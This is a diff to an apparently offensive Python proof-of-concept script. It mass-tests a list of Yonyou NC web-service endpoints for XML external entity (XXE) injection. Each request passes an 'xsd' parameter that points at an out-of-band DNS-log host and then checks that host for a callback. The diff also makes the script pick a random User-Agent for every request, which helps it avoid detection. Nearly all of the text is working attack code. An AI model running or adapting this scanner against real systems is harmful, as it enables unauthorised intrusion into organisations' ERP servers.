@@ -15,7 +15,6 @@ from gevent import monkey;monkey.patch_all()
 from gevent.pool import Pool
 from gevent.queue import Queue
 import requests
-import re
 import os
 import sys
 from urllib.parse import urlparse
@@ -24,6 +23,7 @@ disable_warnings()
 path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.append(path)
 from modules.dnslogs import dnslogs
+from modules import get_user_agent
 
 
 class poc:
@@ -31,7 +31,7 @@ class poc:
         self.url = url
         self.xxe_apis = ["nc.itf.ses.DataPowerService", "nc.itf.tb.outlineversion.TbbOutlineUpateVersionService", "transreport", "nc.itf.ses.inittool.PortalSESInitToolService", "nc.itf.bap.service.IBapIOService", "nc.itf.ses.inittool.SESInitToolService", "nc.uap.oba.update.IUpdateService", "IReqKmToRtDataSrv", "nc.pubitf.rbac.IUserPubServiceWS", "nc.itf.tb.oba.IOBAMasterNodeWebService", "nc.itf.tb.oba.INtbOBAWebService", "nc.itf.smart.ISmartQueryWebService", "nc.itf.bd.crm.IMeasdocExportToCrmService", "nc.itf.bd.crm.IAreaclExportToCrmService", "nc.itf.bd.crm.IInvclExportToCrmService", "nc.itf.bd.crm.ICorpExportToCrmService", "nc.itf.bd.crm.IInvbasdocExportToCrmService", "nc.itf.bd.crm.IUserExportToCrmService", "nc.itf.bd.crm.ICustomerImportToNcService", "nc.itf.bd.crm.ICurrtypeExportToCrmService", "nc.itf.bd.crm.ICustomerExportToCrmService", "nc.itf.bd.crm.IPsndocExportToCrmService"]
         self.headers = {
-            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
+            'Connection': 'close'
         }
         self.q = Queue()
         self.text_list = []
@@ -53,11 +53,12 @@ class poc:
             result_text = ""
             if self.q.qsize() == 0:
                 break
-            api = self.q.get_nowait()
-            dnslog_all = dnslogs(self.proxies).get_dnslog()
-            dnslog = dnslog_all[0]
-            target_url = url + "/uapws/service/" + api + "?xsd=http://" + dnslog + "/ext.dtd"
             try:
+                api = self.q.get_nowait()
+                dnslog_all = dnslogs(self.proxies).get_dnslog()
+                dnslog = dnslog_all[0]
+                target_url = url + "/uapws/service/" + api + "?xsd=http://" + dnslog + "/ext.dtd"
+                self.headers['User-Agent'] = get_user_agent.get_user_agent()
                 result = requests.get(url=target_url, headers=self.headers, verify=False, proxies=self.proxies)
                 for i in range(5):
                     dnslog_result = dnslogs(self.proxies).get_result(dnslog_all[1])
